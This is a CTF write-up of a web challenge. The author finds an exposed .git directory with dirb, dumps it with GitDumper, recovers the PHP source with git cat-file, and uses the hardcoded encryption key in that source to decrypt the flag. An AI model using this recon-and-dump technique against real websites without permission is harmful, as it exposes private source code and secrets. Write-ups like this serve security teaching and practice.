# Problem Statement:
![question](https://raw.githubusercontent.com/0x41head/CTF-Writeups/main/src/DOA2021ctf/web/git%20commit%20-m%20whatever/ques.png)

## Solution:
Going to the URL mentioned in the qustion we are greeted with this:
![1](https://raw.githubusercontent.com/0x41head/CTF-Writeups/main/src/DOA2021ctf/web/git%20commit%20-m%20whatever/1.png)

Brute forcing the directory of this webpage we can see that there is a `.git/HEAD` present
```
$ dirb http://193.57.159.27:53329

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct 12 15:31:52 2021
URL_BASE: http://193.57.159.27:53329/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://193.57.159.27:53329/ ----
+ http://193.57.159.27:53329/.git/HEAD (CODE:200|SIZE:24) 
```

Searching for this related it to `git` in webpages, I found [GitDumper](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh)

I used it to download all the files in .git folder

```
$ ./gitdumper.sh http://193.57.159.27:53329/.git/ dumped_files
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/c2/c1d8bde15fa2174d6acd1284d7251579b8a1b4
[+] Downloaded: objects/4f/bdfd5fda330754872764810dfa2c1ef46f1bb0
[+] Downloaded: objects/49/79a80a4c88cdbb529b51aa231caff61d9228a0
[+] Downloaded: objects/46/5e79b104f83169a4f95900a6a9f42b34e71892
[+] Downloaded: objects/3a/8a916693a0d0acf0320d287318d9ddd123cbe3
[+] Downloaded: objects/07/2aad170b0a780723ef2c690a3fe4f5e3392830
[+] Downloaded: objects/95/d5d6fbb14df57d143ec73df6dc00807f85b1db
[+] Downloaded: objects/0d/4096f89f4ea65a44c2a4038b6f931c95c5eba4
[+] Downloaded: objects/58/a1261b18cc493ba5be1c4ef8f04d258716e419
[+] Downloaded: objects/93/457a2717c9b3196924f76cdf5e30a3e3e91013
[+] Downloaded: objects/bd/9550631ebc3e52df59fb17ca77a08349f318de
[+] Downloaded: objects/17/6a3e14009956fb5eb865f0d059b2db8ed19c07
[+] Downloaded: objects/3c/ec2498dd9929460a8d0cf37e2b9bc3a3964ef6
[+] Downloaded: objects/a7/a4dd98ca6aea65d8263027d26be7a0ef93c4fe
[+] Downloaded: objects/3d/10547f81124a6c5486d37b9372dbd0c9665b4e
[+] Downloaded: objects/51/d5d44ec34588b8996e059840a2a83b70cfa1f7
[+] Downloaded: objects/7b/64c8f6a27ef08579d3bb8fba5e180784beb177
[+] Downloaded: objects/e3/4b27aa5094d032331bd2ce6a0533c646457edf
[+] Downloaded: objects/64/74726b8271cef222bbc8f15f5929cc11aea50e
[+] Downloaded: objects/2a/a684a04e0d8bfed9ebb53ac339a301021c8910
[+] Downloaded: objects/cf/628a4a35910bb0161801f290a2fa38b1e4a596
[+] Downloaded: objects/98/dcb0ff422cbed170c1f1f620ef912d977cfab0
[+] Downloaded: objects/d0/23c46792e96174ccb9218dfad376aab76f0133
[+] Downloaded: objects/4d/d1a0618effc5117615b7a275b3f0983d7bd8ea
[+] Downloaded: objects/e5/0a9600bd4708631c8bc01b319364afaffab94a
[+] Downloaded: objects/41/036870066f9473b83997a9144d2b56f26482e5
[+] Downloaded: objects/5e/ee568e29ee440e93266d007769f1987ba1dff2
[+] Downloaded: objects/93/a04a076cbfb06378292e5b2f9e21a0960a9d21
[+] Downloaded: objects/12/821190c4f46f8d0fd1efea082e54393d2bced3
[+] Downloaded: objects/fc/1f98f6017e2e49df069cf27917731a3b73bca2
[+] Downloaded: objects/5e/b684e2b3288349df63acc7a51c1b82058c16cb
[+] Downloaded: objects/28/00ea0071c9e01b0967726defc26e451ddf7946
[-] Downloaded: objects/70/14a0eb6d1611151a286c0ff4f2238f92c120d6
[+] Downloaded: objects/5b/e48926566ff0c6ff1b14fe369969054843e31b
[+] Downloaded: objects/9f/ed183bcaa6da1ad6a0b6d46e151cd28553ef1a
```
After checking the reference `master`
```
$  cat .git/refs/heads/master 
2756250c7cd2188bdf8c4cdeddc92bcbe13f1755
```
I saw that it pointed to a commit with the hash `2756250c7cd2188bdf8c4cdeddc92bcbe13f1755`

I tried using `cat` to find a bit more information about it.
```
$ git cat-file -p 2756250c7cd2188bdf8c4cdeddc92bcbe13f1755
tree c2c1d8bde15fa2174d6acd1284d7251579b8a1b4
author elliot <macuser@Macs-MacBook-Air.local> 1633254410 +0530
committer elliot <macuser@Macs-MacBook-Air.local> 1633254410 +0530

Committed security suicide
```
Next, I tried looking more into the `tree` hash and found the hash for the `index.php` file
```
$ git cat-file -p c2c1d8bde15fa2174d6acd1284d7251579b8a1b4
040000 tree 4fbdfd5fda330754872764810dfa2c1ef46f1bb0    Crypt
040000 tree 4979a80a4c88cdbb529b51aa231caff61d9228a0    File
040000 tree 465e79b104f83169a4f95900a6a9f42b34e71892    Math
040000 tree 3a8a916693a0d0acf0320d287318d9ddd123cbe3    Net
040000 tree 072aad170b0a780723ef2c690a3fe4f5e3392830    System
100644 blob 95d5d6fbb14df57d143ec73df6dc00807f85b1db    bootstrap.php
100644 blob 0d4096f89f4ea65a44c2a4038b6f931c95c5eba4    index.php
100644 blob 58a1261b18cc493ba5be1c4ef8f04d258716e419    openssl.cnf
```

Using `cat` on the `index.php` hash gave me the source code of the webpage

```
$ git cat-file -p 0d4096f89f4ea65a44c2a4038b6f931c95c5eba4
<?php

/**
 * Simple sodium crypto class for PHP >= 7.2
 * @author MRK
 */
class crypto {

    /**
     * 
     * @return type
     */
    static public function create_encryption_key() {
        return base64_encode(sodium_crypto_secretbox_keygen());
    }

    /**
     * Encrypt a message
     * 
     * @param string $message - message to encrypt
     * @param string $key - encryption key created using create_encryption_key()
     * @return string
     */
    static function encrypt($message, $key) {
        $key_decoded = base64_decode($key);
        $nonce = random_bytes(
                SODIUM_CRYPTO_SECRETBOX_NONCEBYTES
        );

        $cipher = base64_encode(
                $nonce .
                sodium_crypto_secretbox(
                        $message, $nonce, $key_decoded
                )
        );
        sodium_memzero($message);
        sodium_memzero($key_decoded);
        return $cipher;
    }

    /**
     * Decrypt a message
     * @param string $encrypted - message encrypted with safeEncrypt()
     * @param string $key - key used for encryption
     * @return string
     */
    static function decrypt($encrypted, $key) {
        $decoded = base64_decode($encrypted);
        $key_decoded = base64_decode($key);
        if ($decoded === false) {
            throw new Exception('Decryption error : the encoding failed');
        }
        if (mb_strlen($decoded, '8bit') < (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) {
            throw new Exception('Decryption error : the message was truncated');
        }
        $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, '8bit');
        $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, '8bit');

        $plain = sodium_crypto_secretbox_open(
                $ciphertext, $nonce, $key_decoded
        );
        if ($plain === false) {
            throw new Exception('Decryption error : the message was tampered with in transit');
        }
        sodium_memzero($ciphertext);
        sodium_memzero($key_decoded);
        return $plain;
    }

}

$privatekey = "mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=";

$flag = file_get_contents('../flag.txt');

$enc = crypto::encrypt($flag, $privatekey);

echo $enc;

?>

<html>
    <br>
    Only if you could see the source code.
</html>

```

I could now see that there was an `encrypt` and `decrypt` function in the source along with a `$privatekey`.

Copy pasting this code into my own system and using the `decrypt` function with the `$privatekey` and the encrypted text on the webage we were able to retrieve the flag 
```
crypto::decrypt("8tjVQ5fKbDlkzPk3xX4LQvb6ndFJa+sT/0VnRgAwhTfUFMyYgm/aGJWKV518+p9HH8YT2XpOuz6JiDlBtZBFkzbliEScNvtgnL4Xga0O",$privatekey);
```

### Notes:
### Reference:
https://ctftime.org/writeup/23835

https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/
### Tags:
`Web` `git` 